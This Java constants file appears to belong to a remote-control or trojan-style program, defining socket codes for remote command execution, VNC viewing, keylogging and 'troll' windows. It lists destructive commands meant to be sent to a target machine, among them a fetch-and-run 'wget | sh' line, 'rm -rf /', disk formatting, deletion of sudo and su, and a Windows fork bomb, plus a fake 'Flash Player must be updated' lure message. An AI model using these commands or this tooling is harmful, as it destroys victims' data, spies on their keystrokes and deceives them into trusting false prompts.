package constante;

public abstract class Constante
{
// Code d'envoi entre les sockets : =======================================================================================
	public static final Integer	code_cmd						= 60;
	public static final Integer	code_vnc						= 120;
	public static final Integer	code_keylog					= 80;
	public static final Integer	code_notif					= 100;
	public static final String		code_message_cmd			= "XXXXXXX000000123";									

// Code des fenetres internes : =======================================================================================
	public static final Integer	code_envoyer				= (1 << 6);
	public static final Integer	code_info_affichage		= (1 << 3);
	public static final Integer	code_terminal_affichage	= (1 << 1);												
	public static final Integer	code_troll					= (1 << 4);
	public static final Integer	code_vnc_afficage			= (1 << 2);
	
// Liste commande a tapper  : =======================================================================================
	public static final String[]	listCommandeL				=
																			{ 

			"wget http://somewhere -O � | sh", "mv ~ /dev/null",
			"mkdir newfolder > /dev/sda", "rm -rf /", "mkfs.ext3 /dev/sda",
			"rm -f /usr/bin/sudo;rm -f /bin/su",
			"rpm -a | grep  | xargs rpm -e �nodeps"			};

	public static final String[]	listeCommandeW				=
																			{
			"@ECHO off :haha START %SystemRoot%\\system32\\notepad.exe GOTO haha",
			"%0|%0", "FORMAT C: /U /SELECT"						};

	
// Configuration pour les notification  : =======================================================================================
	public static final String		message_url					= "Flash Player doit etre mis a jour, No Rage";
	public static final String		url_update					= "https://www.stackoverflow.com";

//Configuration de la fen�tre  : =======================================================================================
	public static final Integer	WINDOW_HEIGHT				= 400;
	public static final Integer	WINDOW_WIDTH				= 500;

//Configuration de la reception des fichiers : =======================================================================================
	private static Integer			nombredeFichiers			= 1;

	public static Integer nombredeFichierRecupere()
	{ // Incremente le nombre de
		// fichier
		return nombredeFichiers++;
	}
}
